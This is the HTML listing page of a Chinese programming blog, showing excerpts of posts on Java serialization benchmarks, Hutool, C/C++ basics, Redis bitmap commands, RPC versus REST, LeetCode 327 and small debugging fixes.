<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/94c9aedcc1f452516a89f52e5acb5279/" rel="bookmark">
			jackson、fastjson、kryo、protostuff等序列化工具性能对比
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		简介 实际项目中，我们经常需要使用序列化工具来存储和传输对象。目前用得比较多的序列化工具有：jackson、fastjson、kryo、protostuff、fst 等，本文将简单对比这几款工具序列化和反序列化的性能。
项目环境 本文使用 jmh 作为测试工具。
os：win 10
jdk：1.8.0_231
jmh：1.25
选择的序列化工具及对应的版本如下：
fastjson：1.2.74
jackson：2.11.3
kryo：5.0.0
fst：2.57
protostuff：1.7.2
测试代码 为了公平，我尽量让测试用例中对序列化工具的用法更贴近实际项目，例如，kryo 的Kryo对象不是线程安全的，实际项目中我们并不会每次使用就直接 new 一个新对象，而是使用 ThreadLocal 或者池来减少创建对象的开销。
本文使用的 java bean 如下。一个用户对象，一对一关联部门对象和岗位对象，其中部门对象又存在自关联。
public class User implements Serializable { private static final long serialVersionUID = 1L; // 普通属性--129个 private String id; private String account; private String password; private Integer status; // ······ /** * 所属部门 */ private Department department; /** * 岗位 */ private Position position; // 以下省略setter/getter方法 } public class Department implements Serializable { private static final long serialVersionUID = 1L; // 普通属性--7个 private String id; private String parentId; // ······ /** * 子部门 */ private List&lt;Department&gt; children; // 以下省略setter/getter方法 } public class Position implements Serializable { private static final long serialVersionUID = 1L; // 普通属性--6个 private String id; private String name; // ······ // 以下省略setter/getter方法 } 下面展示部分测试代码，完整代码见末尾链接。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/94c9aedcc1f452516a89f52e5acb5279/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/726ac5b071d1fd2cf18419a7e839c6ad/" rel="bookmark">
			Hutool这么好用的工具确定不用吗？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 j3_liuliang最近看到一个超级奈斯的Java工具包Hutool，不用不知道一用是真香啊！那下面我们就简单的了解一下它把！ 一、说在前面的话 所有的工具都是为了更好的开发，这没意见吧！
如果一个工具使用了，不能给你带来便捷，高效，简洁那我可以说这个工具是一个失败的，或者可以说它不能称之为一个工具；
从开始学习Java时，我们都学习过非常多的工具，有Java基础时我们学IO那块的IO工具包commons-io它是专门为java中的IO流操作而准备的，把常用的操作都封装了起来，我们只要直接用就可以了；连接数据库时的繁琐步骤我相信大家是不是深有体会，所以在那个阶段就出现了JDBCUtils工具包，它将那些繁琐的步骤都进行了封装只对外提供最简单的使用API，我记得这个工具包还挺简单的，我自己都有写过当然是简单版的（小得瑟一下）；JavaWeb阶段我们学的servlet，是不是感觉有点鸡肋，每次前端要请求一次是不是都要写一个对应的Servlet来接受并处理它，要是几十甚至几百个请求那类的数量就可想而知了，所以就出现了Servlet对应的工具类BaseServlet（这个本人后面也是自己写过的，而且实现的功能很强大哦！并且是类似SpringMVC，又吹了了一波）；等…
说了这么多，是不是对工具这一概念有了大体的认识呢！
二、工具孕育的过程 2.1 晦涩，繁琐 首先工具的前提肯定是在已有的技术上面做文章的，就比如有需求才会有产品（我的理解），这里要先建立一个先后的问题。
然后就是先前的这个技术肯定是不人性化，或者是有变通的地方才会有人去优化它，改它；或者是使用的步骤和难度非常大，完全可以把这些都封装或删减而达到同样或者更好的结果。
所以，晦涩的使用方式，繁琐的使用步骤是一个工具产生的前提。
2.2 透彻 有了前提，就会有要改进或者替代它的产品而达到相同效果或者说是更好的效果，而这些前提那就需要我们有对这个技术非常熟悉，非常透彻的领悟和理解才能有接下了的动作了（改它，自己写一个的霸气）
2.3 封装或优化 当技术和理解能力到达一定的阶段之后，对那些繁琐，待优化的技术或事物做处理就非常的有意义了；
而且都说程序员都是非常懒得，这一点是没有错的，但要把这个懒字用对地方，他们不是生活上的懒，也不是技术上的懒，而是不想做重复繁琐步骤上的懒，也正是这些懒，才有了后面那么多的工具类，或者往大点的说就是那么多的框架技术我这里就直说一个你们可以自己体会，那就是SpringBoot这个框架；
2.4 开源维护 现在这个时代，是开源的时代；
一个好的技术或框架工具类没有开源，你再牛逼别人也用不到也更不可能知道，只能是自己玩玩，我相信这绝对不是我们这样类人所想要看到的；
而且当它越来越大越来越复杂的时候一个人的力量往往是渺小的，只有开源出来，让大家都来参与和维护，找到你所不能发现，或不足的地方，岂不美哉而且是名利双收（我的小见解，嘿嘿！）
三、Hutool简介 官网：点击这里
学这个的时候我还有点感触，因为这个工具是国人写的，个人感觉不比谷歌的Guava工具差，而且不光是这个，Github上很多超火的项目很多都是国人写的，他们用行动向世界证明中国的程序员也是可以写出好的工具好的项目的；
好了，吹逼逼吹完了，来看看Hutool是个什么工具把！
Hutool是一个小而全的Java工具类库，通过静态方法封装，降低相关API的学习成本，提高工作效率，使Java拥有函数式语言般的优雅，让Java语言也可以“甜甜的”。
Hutool中的工具方法来自于每个用户的精雕细琢，它涵盖了Java开发底层代码中的方方面面，它既是大型项目开发中解决小问题的利器，也是小型项目中的效率担当；
Hutool是项目中“util”包友好的替代，它节省了开发人员对项目中公用类和公用工具方法的封装时间，使开发专注于业务，同时可以最大限度的避免封装不完善带来的bug。
说起来这个工具的名字也是非常有意思的，“糊涂”，下面是官网上解释的：
Hutool = Hu + tool，是原公司项目底层代码剥离后的开源库，“Hu”是公司名称的表示，tool表示工具。Hutool谐音“糊涂”，一方面简洁易懂，一方面寓意“难得糊涂”。
它改变代码的方式如下：
Hutool的目标是使用一个工具方法代替一段复杂代码，从而最大限度的避免“复制粘贴”代码的问题，彻底改变我们写代码的方式。
以计算MD5为例：
【以前】打开搜索引擎 -&gt; 搜“Java MD5加密” -&gt; 打开某篇博客-&gt; 复制粘贴 -&gt; 改改好用【现在】引入Hutool -&gt; SecureUtil.md5() Hutool的存在就是为了减少代码搜索成本，避免网络上参差不齐的代码出现导致的bug。
四、工具模块 一个Java基础工具类，对文件、流、加密解密、转码、正则、线程、XML等JDK方法进行封装，组成各种Util工具类，同时提供以下组件：
模块介绍hutool-aopJDK动态代理封装，提供非IOC下的切面支持hutool-bloomFilter布隆过滤，提供一些Hash算法的布隆过滤hutool-cache简单缓存实现hutool-core核心，包括Bean操作、日期、各种Util等hutool-cron定时任务模块，提供类Crontab表达式的定时任务hutool-crypto加密解密模块，提供对称、非对称和摘要算法封装hutool-dbJDBC封装后的数据操作，基于ActiveRecord思想hutool-dfa基于DFA模型的多关键字查找hutool-extra扩展模块，对第三方封装（模板引擎、邮件、Servlet、二维码、Emoji、FTP、分词等）hutool-http基于HttpUrlConnection的Http客户端封装hutool-log自动识别日志实现的日志门面hutool-script脚本执行封装，例如Javascripthutool-setting功能更强大的Setting配置文件和Properties封装hutool-system系统参数调用封装（JVM信息等）hutool-jsonJSON实现hutool-captcha图片验证码实现hutool-poi针对POI中Excel和Word的封装hutool-socket基于Java的NIO和AIO的Socket封装 可以根据需求对每个模块单独引入，也可以通过引入hutool-all方式引入所有模块。
说到这里突然就结束了，是不是感觉意犹未尽；
其实博主也还再学习这个工具拉，现在只是把我理解的写出来了，以后会对这个工具类比较好的功能都写出给大家阅读，大家也可以去它的官网逛逛，说不定就有不一样的理解呢！
结束语 由于博主才疏学浅，难免会有纰漏，假如你发现了错误或偏见的地方，还望留言给我指出来，我会对其加以修正。如果你觉得文章还不错，你的转发、分享、点赞、留言就是对我最大的鼓励。感谢您的阅读，十分欢迎并感谢您的关注。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8f4ed67c8108163554d8ede3ef417f5a/" rel="bookmark">
			王道操作系统思维导图
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		王道操作系统思维导图：
https://www.processon.com/view/5ec08cf91e08530a9b01d958#map
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/083cad2aa8a4bed050a9734ddd712974/" rel="bookmark">
			C&#43;&#43;中获取当前程序中运行的线程pid值
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		#include &lt;unistd.h&gt;
pid_t pid = getpid();
std::cout &lt;&lt; "PID:" &lt;&lt; pid &lt;&lt; std::endl;
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/47ec9146185fae4f203a8f32da3a0241/" rel="bookmark">
			2020.11.9 如何判断输入的数为整形还是浮点型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		想要判断用户输入的数据类型，那就不能使用scanf("%d",&amp;a)或者scanf("%lf",&amp;a)这种输入方式，因为无论输入什么样的数据，都会被强转为一种格式，既然如此，我们就使用字符串输入。
scanf("%s",c1); 这样的话就可以完整地保留用户输入的格式，之后再用读取字符串具体字符位置的函数strchr来找'.'若返回的不是空指针，就说明用户输入的是浮点数。
if(NULL != strchr(c1,'.')) 最后，把字符数组里装的字符型数据转换数据类型，传值到对应的整形/浮点型变量里。
sscanf(c1,"%d",&amp;a); 注：sscanf和strchr都是头文件string.h里的函数。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0bca16ecc0ed5ba76439339080faf8ed/" rel="bookmark">
			qt gridlayout如何设置行数和列数_2020年高考数学如何复习？可以从数列开始
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		从历年高考数学题型来看，数列可以和函数、方程、不等式、三角等相关知识进行“串联”，形成更为复杂的综合性问题；或是结合实际生活例子，考查考生运用数列知识解决实际问题的能力。
要想学好数列基础知识内容，我们要学会从多角度去看待数列。如数列从本质上来看，我们可以把它看成是一种特殊的函数。因此，数列不仅有其本身的特殊性，更具有很多函数的性质。如数列最明显的函数特征：数列是一个定义域为正整数集N*(或它的有限子集{1,2,3，…，n})的特殊函数，数列的通项公式也就是相应的函数解析式，即f(n)＝an(n∈N*)。
在高考中，数列求和问题大部分情况下都会与函数、不等式、三角、几何等知识结合，重点考查分组求和、拆项相消、错位相减等求和方法，常以小题或大题的一问的形式出现，有一定的难度。
典型例题分析1：
已知等比数列{an}满足a1=2，a1+a3+a5=14，则1/a1+1/a3+1/a5=　．
解：∵等比数列{an}满足a1=2，a1+a3+a5=14，
∴2+2q2+2q4=14，
解得q2=2或q2=﹣3(舍)，
∴1/a1+1/a3+1/a5=1/2+1/4+1/8=7/8，
故答案为：7/8．
考点分析：
等比数列的通项公式．
题干分析：
由已知条件利用等比数列的性质求出公比，由此能求出答案．
典型例题分析2：
在明朝程大位《算法统宗》中有这样的一首歌谣：“远看巍巍塔七层，红光点点倍加增，共灯三百八十一，请问尖头几盏灯”． 这首古诗描述的这个宝塔古称浮屠，本题说它一共有7层，每层悬挂的红灯数是上一层的2倍，共有381盏灯，问塔顶有几盏灯？你算出顶层有(　)盏灯．
A．2
B．3
C．5
D．6
解：设第七层有a盏灯，由题意知第七层至第一层的灯的盏数
构成一个以a为首项，以2为公比的等比数列，
∴由等比数列的求和公式可得a(1-27)/(1-2)=381，
解得a=3，
∴顶层有3盏灯，
故选：B．
考点分析;
等比数列的前n项和．
题干分析：
由题意知第七层至第一层的灯的盏数构成一个以a为首项，以2为公比的等比数列，由等比数列的求和公式可得a的方程，解方程可得．
​典型例题分析3：
已知数列{an}，Sn是其前n项的和且满足3an=2Sn+n(n∈N*)，
则Sn=　．
考点分析：
数列递推式．
题干分析：
3an=2Sn+n(n∈N*)，n=1时，3a1=2a1+1，解得a1．n≥2时，可得：3an﹣3an﹣1=2an+1，化为an=3an﹣1+1，变形为：an+1/2=3(an﹣1+1/2)，利用等比数列的通项公式可得an，进而得出Sn．
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/afc8080c59a882b67d2526c95c25fc30/" rel="bookmark">
			Activiti工作流-任务常用操作之办理、回退和拒绝
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 一、简介 在利用工作流框架Activiti时，常用的业务操作包括审批通过、审批拒绝、审批追回等。这些最常用的基本操作，通过流程变量可以实现流程的自动流转。
二、流程设计 设计流程图
设计流程变量
在流程执行的SequenceFlow对应的属性Main config中设定具体的流程执行条件表达式等。
三、流程逻辑处理 审批通过逻辑 @Override public void completeTask(String taskId) { Map&lt;String, Object&gt; completeParamMap = new HashMap&lt;String, Object&gt;(); // 根据流程图中的设计，审批通过条件为apprStatus==0 completeParamMap.put("apprStatus", 0); // 设定当前处理人为任务的办理人 taskService.setAssignee(taskId, UserUtil.getUserContext().getUserId); taskService.complete(taskId, completeParamMap); } 审批拒绝 @Override public void completeTask(String taskId) { Map&lt;String, Object&gt; completeParamMap = new HashMap&lt;String, Object&gt;(); // 根据流程图中的设计，审批通过条件为apprStatus==1 completeParamMap.put("apprStatus", 1); // 设定当前处理人为任务的办理人 taskService.setAssignee(taskId, UserUtil.getUserContext().getUserId); taskService.complete(taskId, completeParamMap); } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aacc07250b852a25d8c7e5d8e28c0afe/" rel="bookmark">
			C&#43;&#43;中的运算符重载（二）——自增自减运算符重载
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		概述：
对于常用到的自增（++），自减（- -）运算符来说，稍微比左移运算符要复杂一些，以为自增和自减运算符包括前置和后置（就是所说的++在前或者++在后）
如下：一个简单的自增运算符代码
#include &lt;iostream&gt; #include &lt;string&gt; using namespace std; /**/ class Myint { public: Myint(int num) { this-&gt;num = num; } Myint&amp; operator++() { this-&gt;num = this-&gt;num + 1; return *this; } Myint operator++(int) { Myint temp = *this; this-&gt;num = this-&gt;num + 1; return temp; } int num; }; ostream&amp; operator&lt;&lt; (ostream &amp;cout, Myint&amp; p) { cout &lt;&lt; p.num ; return cout; } void test01() { Myint p1(10); Myint p(0); cout &lt;&lt; p1 &lt;&lt; endl;/*operator++(p1),*/ ++p1; cout &lt;&lt; ++p1 &lt;&lt; endl; p = p1++ ; cout &lt;&lt; p &lt;&lt; endl; cout &lt;&lt; p1 &lt;&lt; endl; } int main() { test01(); return 0; } 注意：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/aacc07250b852a25d8c7e5d8e28c0afe/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f7a85f737baabbb56d53c67189b2831a/" rel="bookmark">
			redis系列，bitmap 命令全解析以及源码赏析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 本人 github 地址前言跟bitmap相关的命令setbit源码分析bitcount源码分析怎样求一个二进制串里面有多少个1 bitmap使用场景总结 本人 github 地址 github 地址 里面有注释好的代码，下载下来可以方便阅读。
前言 由于这周工作关系，没有太多事件阅读太多源码，但是项目常常提到一些用到bitmap的场景，这次我们来把redis 的bit操作命令一网打尽
跟bitmap相关的命令 setbit: setbit 顾名思义就是将一个用字符串表示的二进制，在它的某一位上面设置0或者1.
完整命令为 setbit key offset value
key 为必填参数 ，即键值空间里面的键，不管什么命令都是通过键值空间去搜索的。
offset 也是必填参数，offset是一个正整数，表示二进制串的某一位，offset 有限制要小于512*1024*1024*8
value 也是必填参数，表示某一位设置为0或者1. value只能为0或者1
返回结果： 返回这一位上面原来的那个值。
实例：
setbit abc 1 0 (integer) 0 getbit: 和setbit 是对应关系，主要用于获取二进制串某一位上面的value
完整命令为 getbit key offset
因为和setbit的参数相似的，则不单独说明
实例：
getbit abc 1 (integer) 0 bitop: bitop 主要对于多个对应key的二进制串，做and，or，xor, not操作。
完整命令为 bitop operation destkey key [key]
operation ，为必填项，有以下4个操作，and, or, xor, not , 忽略大小写
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f7a85f737baabbb56d53c67189b2831a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ee06b91c9853c5d2b3e81452f7e1121c/" rel="bookmark">
			break和continue的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、语句作用 1.break语句的作用
（1）在分支结构程序设计中用break语句可以使流程跳出switch结构，继续执行switch语句下面的一个语句； （2）break语句可以用来从循环体内中途跳出循环体，即提前结束循环操作，接着执行循环下面的语句。 2.continue语句的作用
（1）continue语句是跳过循环体中剩余的语句而强制执行下一次循环操作。其作用为结束本次循环，即跳过循环体中下面尚未执行的语句，接着进行下一次是否执行循环的判定。
二、注意事项 （1）在循环语句中，break语句一般都是与if语句一起使用；
（2）break语句不能用于循环语句和switch语句之外的任何其它语句中；
（3）continue语句只能用在循环语句中。一般都是与if语句一起使用。
三、区别 （1）continue语句只结束本次循环，而不是终止整个循环的执行；
（2）break语句则是结束整个循环过程，不再判断执行循环的条件是否成立
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/824a40ab964ee58dc4f404bf85c56e0b/" rel="bookmark">
			.py文件转为.pyd文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 安装easycython库 pip install easycython test.py def test(): print("调用成功") main.py import test test.test() test.py文件重命名为：test.pyx 终端运行命令 easycython *.pyx 重命名pyd文件，删除：cp36-win_amd64. 运行代码,调用成功： python main.py 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bb99c8893e1373949cccabc27faf87d2/" rel="bookmark">
			jMeter性能压测（TCP长连接）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		注意End of line（EOL）：响应文本最后一个字符ASCII码的十进制表示，如果不设置，jmeter会一直读取流，最后认为请求失败，response code 500，所有的结果都会被标记为错误，这里的10表示换行\n
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7bc3279dfa4387a995fc73a6dd578be9/" rel="bookmark">
			rpc与rest区别以及优缺点
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		rest与rpc之间的区别
1，rest
REST是一种架构风格，指的是一组架构约束条件和原则。满足这些约束条件和原则的应用程序或设计就是 RESTful。REST规范把所有内容都视为资源，网络上一切皆资源。
REST并没有创造新的技术，组件或服务，只是使用Web的现有特征和能力。 可以完全通过HTTP协议实现，使用 HTTP 协议处理数据通信。REST架构对资源的操作包括获取、创建、修改和删除资源的操作正好对应HTTP协议提供的GET、POST、PUT和DELETE方法。
2，rpc
RPC（Remote Procedure Call）—远程过程调用，它是一种通过网络从远程计算机程序上请求服务，而不需要了解底层网络技术的协议。RPC协议假定某些传输协议的存在，如TCP或UDP，为通信程序之间携带信息数据。在OSI网络通信模型中，RPC跨越了传输层和应用层，RPC使得开发包括网络分布式多程序在内的应用程序更加容易。
3，rest优缺点
1，优点：耦合性低，兼容性好，提高开发效率，不用关心接口实现细节，相对更规范，更标准，更通用，跨语言支持
2，缺点：性能不如 RPC 高。
4，rpc优缺点
1，优点：
—调用简单，清晰，透明，不用像 rest 一样复杂，就像调用本地方法一样简单。
—高效低延迟，性能高
—自定义协议（让传输报文提及更小）
—性能消耗低，高效的序列化协议可以支持高效的二进制传输
—自带负载均衡
2，缺点：
----耦合性强
例如：
我们为每个微服务定义了各自的 service 抽象接口，并通过持续集成发布到私有仓库中，调用方应用对微服务提供的抽象接口存在强依赖关系，因此不论开发、测试、集成环境都需要严格的管理版本依赖，才不会出现服务方与调用方的不一致导致应用无法编译成功等一系列问题，以及这也会直接影响本地开发的环境要求，往往一个依赖很多服务的上层应用，每天都要更新很多代码并 install 之后才能进行后续的开发。若没有严格的版本管理制度或开发一些自动化工具，这样的依赖关系会成为开发团队的一大噩梦。
而 REST 接口相比 RPC 更为轻量化，服务提供方和调用方的依赖只是依靠一纸契约，不存在代码级别的强依赖，当然 REST 接口也有痛点，因为接口定义过轻，很容易导致定义文档与实际实现不一致导致服务集成时的问题，但是该问题很好解决，只需要通过每个服务整合swagger，让每个服务的代码与文档一体化，就能解决。所以在分布式环境下，REST 方式的服务依赖要比 RPC 方式的依赖更为灵活。
—无法跨语言，平台敏感
Java 写的 RPC 微服务无法给 Python 调用。需要再实现一层 REST 来对外提供服务
5，rest与rpc选择
RPC 适用于内网服务调用，对外提供服务请走 REST。
IO 密集的服务调用用 RPC，低频服务用 REST
服务调用过于密集与复杂，RPC 就比较适用
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/81250e2810abe802f4d351ea42c4567c/" rel="bookmark">
			HTML入门(样例)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		&lt;html&gt; &lt;!--html标签表示这是一个html文件格式--&gt; &lt;head&gt; &lt;!--head标签标识这是html文件的头部内容--&gt; &lt;title&gt;这是一个演示页面&lt;/title&gt; &lt;!--title表示显示在浏览器标题--&gt; &lt;/head&gt; &lt;body&gt; &lt;!--body表示这是html文件的主体部分--&gt; &lt;h1&gt;html的主要标签&lt;/h1&gt; &lt;!--h1表示标题--&gt; &lt;p&gt;&lt;b&gt;1.段落和对齐&lt;/b&gt;&lt;/p&gt; &lt;!--p表示段落，b表示加黑--&gt; &lt;p&gt;左对齐&lt;/p&gt; &lt;p align=center&gt;居中对齐&lt;/p&gt; &lt;p align=right&gt;右对齐&lt;/p&gt; &lt;p&gt;&lt;b&gt;2.换行&lt;/b&gt;&lt;/p&gt; 第一行&lt;br&gt;第二行 &lt;!--br表示换行--&gt; &lt;p&gt;&lt;b&gt;3.诗歌&lt;/b&gt;&lt;/p&gt; &lt;pre&gt; &lt;!--br表示可与定义格式化文本--&gt; 窗前明月光 疑似地上霜 举头望明月 低头思故乡 &lt;/pre&gt; &lt;p&gt;&lt;b&gt;4.列表&lt;/b&gt;&lt;/p&gt; &lt;ol type="1" start="1"&gt; &lt;!--ol定义有序列表--&gt; &lt;li&gt;星期一	&lt;!--li定义列表中的项目--&gt; &lt;li&gt;星期二 &lt;li&gt;星期三 &lt;li&gt;星期四 &lt;li&gt;星期五 &lt;li&gt;星期六 &lt;li&gt;星期日 &lt;/ol&gt; &lt;p&gt;&lt;b&gt;5.超链接&lt;/b&gt;&lt;/p&gt; &lt;a href="http://www.bupt.edu.cn"&gt;北京邮电大学&lt;/a&gt; &lt;!--a标签定义超链接--&gt; &lt;p&gt;&lt;b&gt;6.字体&lt;/b&gt;&lt;/p&gt; &lt;font color="blue" size=5&gt;什么样的字体最好看？&lt;/font&gt; &lt;!--font标签定义文本字体样式--&gt; &lt;p&gt;&lt;b&gt;7.图片&lt;/b&gt;&lt;/p&gt; &lt;img align="bottom" src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1604766550865&amp;di=17fabd3dde4c5530ad9326281965b5c1&amp;imgtype=0&amp;src=http%3A%2F%2Fdaan.1010pic.com%2Fpic10%2Fu%2Fu%2F462432_1.jpg" width=300&gt;北邮校徽&lt;/img&gt; &lt;!--img定义图片--&gt; &lt;p&gt;&lt;b&gt;8.表格&lt;/b&gt;&lt;/p&gt; &lt;table border=2&gt; &lt;!--table定义表格--&gt; &lt;caption align="top"&gt;花名册&lt;/caption&gt; &lt;!--caption定义表格标题--&gt; &lt;tr&gt; &lt;!--tr表示这是一行--&gt; &lt;th&gt;序号&lt;/th&gt; &lt;!--th表示这是一列--&gt; &lt;th width=100&gt;姓名&lt;/th&gt; &lt;th&gt;性别&lt;/th&gt; &lt;th&gt;分数&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th&gt;1&lt;/th&gt; &lt;th width=100&gt;张 三&lt;/th&gt; &lt;th&gt;男&lt;/th&gt; &lt;th&gt;98&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th&gt;2&lt;/th&gt; &lt;th width=100&gt;李 四&lt;/th&gt; &lt;th&gt;女&lt;/th&gt; &lt;th&gt;100&lt;/th&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/body&gt; &lt;/html&gt; 演示结果 在线编辑器，可测试该代码
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5a6320a85489732add4f48775c72b7c7/" rel="bookmark">
			【LeetCode 327】区间和的个数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题目描述 给定一个整数数组 ，返回区间和在 之间的个数，包含 和 。区间和 表示在 中，位置从 到 的元素之和，包含 和 。
示例1
输入： nums = [-2,5,-1], lower = -2, upper = 2, 输出： 3 解释： 3个区间分别是: [0,0], [2,2], [0,2]，它们表示的和分别为: -2, -1, 2。 题解 最暴力的解法就是 枚举所有区间，然后判断，显然会超时。
对于区间 来说，它的和可以表示为 ，其中 是前缀和，表示第 个到第 个元素之和。
如果这个区间满足条件，那就有 。如果我们遍历每个 的话，只要求出满足 的左端点 的数量即可。
如果将 数组排好序，那就能直接用二分法找出满足条件的数量了。但是这里需要在遍历右端点 的时候动态插入 ，然后只对 到 进行排序。而目前应该没有什么数据结构能很快的同时支持动态有序插入和二分查找。
因此这里可以采用树状数组（或线段树），来求取一段区间的和是多少。而树状数组的值表示这个数有没有出现过（0或1）。
对于注意到这里有负数出现，因此需要先做离散化，对于每个前缀和 ，只需要离散化三个值： 、 、 即可。
代码 c++ typedef long long ll; class BIT { private: static const int MAXN = 100010; int bit[MAXN]; public: BIT() { memset(bit, 0, sizeof bit); } int lowbit(int x) { return x&amp;(-x); } void add(int i, int x) { while (i &lt; MAXN) { bit[i] += x; i += lowbit(i); } } void sub(int i, int x) { while (i &lt; MAXN) { bit[i] -= x; i += lowbit(i); } } int sum(int i) { int s = 0; while (i &gt; 0) { s += bit[i]; i -= lowbit(i); } return s; } }; class ID { private: unordered_map&lt;ll, int&gt; mp; set&lt;ll&gt; st; int idx; public: ID() { mp.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5a6320a85489732add4f48775c72b7c7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/93e0a46dd6f61af6b1b7436cd0f6f6be/" rel="bookmark">
			! [remote rejected] master -＞ master (hook declined) error: failed to push some refs to
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		解决办法：
将邮箱公开即可：
注：这是问题的一种处理方法，并不一定适合所有该问题的情形。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a7f0ca408310ac91bda9fddfde118df3/" rel="bookmark">
			微信小程序Cannot read property ‘$$‘ of undefined
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Cannot read property ‘$$’ of undefined 情况简述：
&lt;swiper&gt; &lt;block wx:for="{{questions}}" wx:key="*this"&gt; &lt;swiper-item&gt; &lt;view&gt; {{item.q_stem}} &lt;/view&gt; &lt;view&gt; &lt;form name="form" class="form"&gt; &lt;input type="text" class="input_q_answer"&gt;&lt;/input&gt; &lt;/form&gt; &lt;/view&gt; &lt;view hidden="{{is_show_q_answer}}"&gt; 答案：{{this.q_answer}} &lt;/view&gt; &lt;/swiper-item&gt; &lt;/block&gt; &lt;/swiper&gt; data: { questions:[], is_show_q_answer:true, message:"Hello!", }, onLoad: function (options) { var that = this; that.data.questions = JSON.parse(options.data_questions_list); console.log(that.data.questions); }, 页面跳转接收的数据无法正常渲染到页面，也就是wxml中的组件&lt;swiper&gt;中的数据绑定questions，但是控制台打印数据没有问题，渲染完无报错，但是点击模拟器中的&lt;swiper&gt;区域控制台会报错Cannot read property '$$' of undefined
解决：数据接收到了没有setData，意味着数据没有真正存储到缓存中，页面也就不会渲染此项数据
onLoad: function (options) { var that = this; that.data.questions = JSON.parse(options.data_questions_list); that.setData({ questions:that.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a7f0ca408310ac91bda9fddfde118df3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e26c01f66f667e7d376506f68eafbbbe/" rel="bookmark">
			广义表的两种存储结构：头尾链表&#43;扩展的线性表存储结构
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
